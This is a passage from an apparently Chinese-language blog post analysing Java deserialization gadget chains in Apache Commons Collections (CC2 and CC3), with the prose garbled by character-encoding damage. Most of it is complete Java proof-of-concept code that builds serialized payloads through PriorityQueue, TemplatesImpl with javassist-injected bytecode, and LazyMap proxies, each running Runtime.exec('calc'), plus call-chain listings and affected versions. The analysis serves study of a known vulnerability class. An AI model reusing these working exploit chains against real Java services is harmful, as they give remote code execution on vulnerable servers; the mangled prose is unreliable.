class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        Field comparator = clz.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<span class="hljs-comment">//getFieldÊó†Ê≥ïËé∑Âæó</span><br>        comparator.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator.set(queue, transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÊúâÊñáÁ´†ÊèêÂà∞Ë¶ÅÂú® add ‰πãÂêéÊâçÈÄöËøáÂèçÂ∞Ñ‰øÆÊîπ comparator ÁöÑÂÄºÔºöadd-&gt;offer-&gt;siftUpÔºåÊ≠§Êó∂Ë¶Å‰øùËØÅ<code>comparator</code>ÁöÑÂÄº‰∏∫ nullÔºåÊâçËÉΩÊ∑ªÂä†ÂÖÉÁ¥†ÔºåÂê¶Âàô‰ºöÂá∫Áé∞Êä•ÈîôÔºå‰ΩÜÊàëÊµãËØïÊ≤°ÊúâÈóÆÈ¢òÔºå‰∏çÁü•ÈÅìÊòØÂê¶ÁâàÊú¨ÈóÆÈ¢ò</p>
<h3 id="Gadget-1"><a href="#Gadget-1" class="headerlink" title="Gadget"></a>Gadget</h3><p>ÁÑ∂ËÄå cc2 Áî®ÁöÑÈìæ‰ªçÁÑ∂‰∏éÊàë‰ª¨ÁöÑ‰∏ç‰∏ÄËá¥Ôºåcc2 ‰ΩøÁî®ÁöÑÊòØ<code>javassist</code>Âíå<code>TemplatesImpl</code></p>
<p>ÈÇ£‰πàÁé∞Âú®ÈúÄË¶ÅÂ∞Ü<code>TemplatesImpl.newTransformer</code>Ëß¶ÂèëÁöÑÊñπÂºèÔºåËøõ‰∏ÄÊ≠•ÈÄöËøá<code>PriorityQueue</code>Âíå<code>TransformingComparator.compare</code>Â∫èÂàóÂåñ‰ª•Âèä<code>InvokerTransformer.transform</code>ÊâßË°å‰ªªÊÑè‰ª£Á†ÅÂª∂Èïø</p>
<p>poc Â¶Ç‰∏ãÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br><br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br><span class="hljs-comment">//        setFieldValue(templatesimpl,&quot;_class&quot;,null);</span><br><span class="hljs-comment">//        setFieldValue(templatesimpl,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><br>        InvokerTransformer newTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(newTransformer);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br>        Object[] queue_array =<span class="hljs-keyword">new</span> Object[] &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,queue_array);<br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setFieldValue(queue,<span class="hljs-string">&quot;comparator&quot;</span>,transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>‰πãÂâçÊèêÂà∞<code>_tfactory</code>Âíå<code>_class</code>Âõ†‰∏∫<code>TransformerFactoryImpl</code>ÁΩÆ‰∏∫Á©∫‰ª•Âèä<code>TemplatesImpl</code>‰ºöËµãÂÄº<code>_class</code>ÔºåËøôÈáå poc Âç¥‰∏çÈúÄË¶ÅÂÜçËÆæÁΩÆÂÖ∂ÂÄºÔºåÂõ†‰∏∫Âú®Ëß¶ÂèëÂà∞<code>TemplateImpl.newTransformer.TransformerImpl</code>‰ºöËÆæÁΩÆ<code>_tfactory</code>ÂÄº‰∏∫<code>TransformerFactoryImpl _tfactory = null</code>Ôºå<code>_class</code>ÂÄºÂàôÊòØ<code>_class = new Class[classCount]=new Class[1]=null</code>ÔºåÁ¨¶ÂêàËøõÂÖ•<code>defineTransletClasses</code>ÁöÑÊù°‰ª∂</p>
<p>ËÄå<code>PriorityQueue</code>ÈúÄË¶Å add ‰∏§Ê¨°(ËøôÈáåÊ≤°ÊúâËøõË°å addÔºåËÄåÊòØÈÄöËøáÂèçÂ∞ÑÁõ¥Êé•ËÆæÁΩÆ<code>size</code>ÔºåÂõ†Ê≠§‰∏çÂèóÂÖ∂ÊûÑÈÄ†ÊñπÊ≥ïÁöÑ<code>initialCapacity</code>‰º†ÂÄºÂΩ±Âìç)ÔºåÂπ∂ËÆæÁΩÆ<code>comparator</code>‰∏∫<code>TransformingComparator</code>ÂÆû‰æãÂØπË±°ÊâçËÉΩÊàêÂäüË∞ÉÁî®ÔºåÂâçÈù¢Â∑≤ÁªèÂàÜÊûêËøá‰∫Ü‰∏çÂÜçËµòËø∞</p>
<h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><h3 id="Pre-2"><a href="#Pre-2" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-2"><a href="#ÈôêÂà∂-2" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk1.7 &lt; 8u71</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ-2"><a href="#Âà©Áî®Èìæ-2" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>              <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                              TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                       <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª-2"><a href="#ÂÖ≥ÈîÆÁ±ª-2" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">TrAXFilter<br>Templates<br>TemplatesImpl<br>InstantiateTransformer <span class="hljs-regexp">//</span>ÊõøÊç¢InvokerTransformer<br><br>ClassPool<br>CtClass<br>AbstractTranslet<br><br>Transformer<br>ConstantTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure>

<p>CC3 ÊòØ CC1+CC2 ÁöÑÂèòÁßçÔºåCC2 ‰ΩøÁî®‰∫Ü<code>TemplatesImpl.newTransformer</code>Êù•Ëß¶ÂèëÂëΩ‰ª§ÊâßË°åÔºõËÄå ysoserial ‰∏≠ CC3 ‰ΩøÁî®ÁöÑÊòØ<code>TrAXFilter</code>Á±ªË∞ÉÁî®<code>newTransformer</code></p>
<h3 id="Gadget-2"><a href="#Gadget-2" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="‚ë†p-ÁâõÁÆÄÂåñÁöÑÈìæÂ≠ê"><a href="#‚ë†p-ÁâõÁÆÄÂåñÁöÑÈìæÂ≠ê" class="headerlink" title="‚ë†p ÁâõÁÆÄÂåñÁöÑÈìæÂ≠ê"></a>‚ë†p ÁâõÁÆÄÂåñÁöÑÈìæÂ≠ê</h4><blockquote>
<p>Âú® ÂÆâÂÖ®Êº´Ë∞à‰∏≠ËÆ∞ÂΩï‰∫ÜÂ¶Ç‰∏ãÁöÑÁªìÂêàÊñπÂºèÔºåÂê´ CC2 ÁöÑ<code>TemplateImpl</code></p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>	  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>		  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>    		  <span class="hljs-keyword">method</span>.invoke<span class="hljs-literal">()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplateClassLoader</span>.</span></span>define<span class="hljs-constructor">Class()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br></code></pre></td></tr></table></figure>
</blockquote>
<p>CC2 ‰∏≠Ôºå‰ΩøÁî®<code>TransformingComparator</code>ÂéªÂ§ÑÁêÜ<code>new InvokerTransformer(&quot;newTransformer&quot;, null, null)</code></p>
<p>ËÄå CC3ÔºåÂàôÊîπÈÄ†‰∫Ü CC1 ÁöÑÊï∞ÁªÑÔºå<code>new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</code>Êîπ‰∏∫<code>new InvokerTransformer(&quot;newTransformer&quot;, null, null)</code>ÂéªÊâßË°å<code>TemplatesImpl.newTransformer</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC3;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3Ezbyp</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(templates,&quot;_class&quot;,null);</span><br><span class="hljs-comment">//        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(templates),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>),<br>        &#125;);<br>        HashMap hashMap = <span class="hljs-keyword">new</span> HashMap();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, lazyMap);<br><br>        Map proxymap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,  invocationHandler);<br>        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxymap);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(handler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="‚ë°TrAXFilter-InstantiateTransformer"><a href="#‚ë°TrAXFilter-InstantiateTransformer" class="headerlink" title="‚ë°TrAXFilter+InstantiateTransformer"></a>‚ë°TrAXFilter+InstantiateTransformer</h4><blockquote>
<p>ysoserial ÁöÑ‰ª£Á†ÅÔºå‰ºöÂèëÁé∞<code>CommonsCollections3</code>Âíå‰∏äËø∞‰ª£Á†ÅÂπ∂‰∏çÂêåÔºåÊ≤°Êúâ‰Ωø‚Ω§Âà∞<code>InvokerTransformer</code>„ÄÇÂéüÂõ†ÊòØÂõ†‰∏∫Ôºö2015 Âπ¥ÂàùÔºå@frohoff Âíå@gebl ÂèëÂ∏É‰∫Ü Talk„ÄäMarshalling Pickles: how deserializing objects will ruin your day„ÄãÔºå‰ª•Âèä Java ÂèçÂ∫èÂàóÂåñÂà©‚Ω§‚ºØÂÖ∑ ysoserialÔºåÈöèÂêéÂºïÁàÜ‰∫ÜÂÆâÂÖ®Áïå„ÄÇ</p>
